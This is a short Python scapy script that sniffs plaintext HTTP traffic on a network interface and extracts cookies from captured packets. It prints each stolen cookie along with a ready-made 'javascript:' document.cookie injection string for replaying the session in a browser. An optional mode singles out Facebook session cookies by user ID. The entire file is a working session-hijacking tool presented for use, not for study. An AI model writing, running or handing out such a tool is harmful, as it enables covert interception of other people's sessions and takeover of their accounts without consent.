#!/usr/bin/env python

import sys, os
from scapy.all import *
cookies_seen =()

def isRoot():
	"""Verifies if the current user is root"""
	return os.getuid() & os.getgid() == 0
	
def dictStringValue(raw_values):
	value = raw_values.split('=')
	return {value[0].strip():value[1].strip()}
	
def cookieIntoDict(raw_cookie):
	cookie_list = raw_cookie.split(';') 
	cookie = {}
	for element in cookie_list:
		try:
			cookie.update(dictStringValue(element))
		except IndexError:
			pass
	return cookie
	
def extractCookie(headers):
	raw_cookie =""
	for line in headers.split('\n'):   
		if 'Cookie:' in line:
			raw_cookie = line
	return cookieIntoDict(raw_cookie[len("Cookie: "):])
							 
def jsCookie(dictCookie):			
		return ''.join(['void(document.cookie="' + key + '=' + dictCookie[key]+ '");' for key in dictCookie.keys()])		

def printCookie(cookie):
	for key in cookie.keys():
		print "%s = %s" % (key,cookie[key])
	print "[*] Javascript Injection code:"
	print 'javascript:' + jsCookie(cookie) + '\n'
	
def sniffCookies(p):  
	 global cookies_seen
	 if 'Cookie:' in getattr(p,'load',''):
		cookie = extractCookie(p.load)
		if not "-f" in sys.argv and cookie not in cookies_seen:
			print "[+] New cookie seen: "
			printCookie(cookie)
		elif cookie.has_key("datr") and cookie.has_key("c_user") and cookie["c_user"] not in cookies_seen: # We have ourselves a facebook Cookie from a unseen profile 
			print "# Found cookie for facebook user %s:" % cookie["c_user"]
			printCookie(cookie)
			cookies_seen = cookies_seen + (cookie["c_user"],)
		cookies_seen = cookies_seen + (cookie,)

def printUsage():
	print "Usage: %s <-f> IFACE" % sys.argv[0]
	
if __name__ == "__main__":
	if len(sys.argv) < 2:
		printUsage()
		sys.exit(0)
		
	if not isRoot():
		print "[-] Your have to be root to sniff interfaces"
		sys.exit(0)
									 		
	interface = sys.argv[1]
	if "-f" in sys.argv: print "[+] Printing facebook profile cookies only"
	sniff(iface=interface,filter="tcp port 80",prn=sniffCookies)